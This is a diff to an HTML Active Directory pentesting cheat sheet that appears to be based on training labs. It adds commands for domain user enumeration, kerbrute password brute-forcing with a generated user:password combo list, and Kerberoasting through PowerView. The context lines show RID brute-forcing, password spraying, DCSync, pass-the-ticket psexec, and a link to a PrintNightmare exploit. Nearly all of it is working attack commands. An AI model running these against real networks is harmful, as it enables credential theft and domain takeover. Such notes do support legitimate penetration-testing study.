@@ -50,6 +50,10 @@ python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmc
                 <p>Once you have an username you can rid-brute</p>
                 <pre><code class="language-bash">crackmapexec smb 10.10.11.250 -u USERNAME -p "PASSWORD" --rid-brute #Once you have a user you can rid-brute to show all users
 crackmapexec smb 10.10.11.250 -u USERNAME -p "PASSWORD" --users</code></pre>
+                <p>The last one is good in case there aren't a lot of users. Even though there is a quicker way to do so</p>
+                <pre><code class="language-bash">net user /domain</code></pre>
+                <p>Youll need to copy the username list to an excel and format it since powershell show you in three columns</p>   
+                
             </ul>
 
                 
@@ -253,7 +257,14 @@ lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:proxyagent</code></pre>
  Invoke-DomainPasswordSpray -Password Winter2022 -OutFile success -ErrorAction SilentlyContinue</code></pre>
                         </ul>
                         <p>Brute user (One user a lot of passwords)</p>
-                        <pre><code class="language-bash">kerbrute bruteuser --dc 10.10.11.69 -d fluffy.htb /usr/share/wordlists/usernames.txt john </code></pre>
+                        <pre><code class="language-bash">kerbrute bruteuser --dc 10.10.11.69 -d fluffy.htb /usr/share/wordlists/passwords.txt john </code></pre>
+                        <p>Brute Force (combos list)</p>
+                        <p>Create a combos list with username and password</p>
+                        <pre><code class="language-bash">awk 'NR==FNR{p[++np]=$0; next}{for(i=1;i<=np;i++) 
+print $0 ":" p[i]}' passwords.txt users.txt > combos.txt</code></pre>
+                        <p>Now execute the attack</p>
+                        <pre><code class="language-bash">cat combos.lst | ./kerbrute -d lab.ropnop.com bruteforce -</code></pre>
+
                     </ul>
 
                     <h3>AS-REP Roasting Attack</h3>
@@ -281,7 +292,7 @@ impacket-GetUsersSPNs DOMAIN.LOCAL/USER:PASSWORD -dc-ip TARGET_IP -request-user 
                         <p>Show the hash</p>
                         <pre><code class="language-bash">hashcat --show -m 13100 hash</code></pre>
                         <p>Command in case you are inside a dc or sort of. You'll need powerview.ps1</p>
-                        <pre><code class="language-powershell">Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName</code></pre>
+                        <pre><code class="language-powershell">Get-DomainUser -Identity svc_sql | Get-DomainSPNTicket -Format Hashcat</code></pre>
                         <h4>Rubeus.exe</h4>
                         <ul>
                             <p>We can perform the same thing from inside using rubeus.exe There are some useful commands which should be noted</p>
@@ -478,7 +489,8 @@ $SD.GetBinaryForm($SDBytes, 0)</code></pre>
                     <pre><code class="language-bash">mv administrator_ACADEMY-EA-DC01.inlanefreight.local.ccache /tmp/admin.ccache</code></pre>
                     <pre><code class="language-bash">export KRB5CCNAME=/tmp/admin.ccache</code></pre>
                     <pre><code class="language-bash">psexec.py -k -no-pass INLANEFREIGHT.LOCAL/Administrator@ACADEMY-EA-DC01.inlanefreight.local</code></pre>
-                    
+                </ul>
+                   
                 <h2 id="PrintNightmare">PrintNightmare</h2>
                 <ul>
                     <p>A vulnerability found in the Print Spooler service that runs on all Windows operating systems, Clone the repo from <a class="notion-link" href="https://github.com/cube0x0/CVE-2021-1675">CVE-2021-1675</a></p>
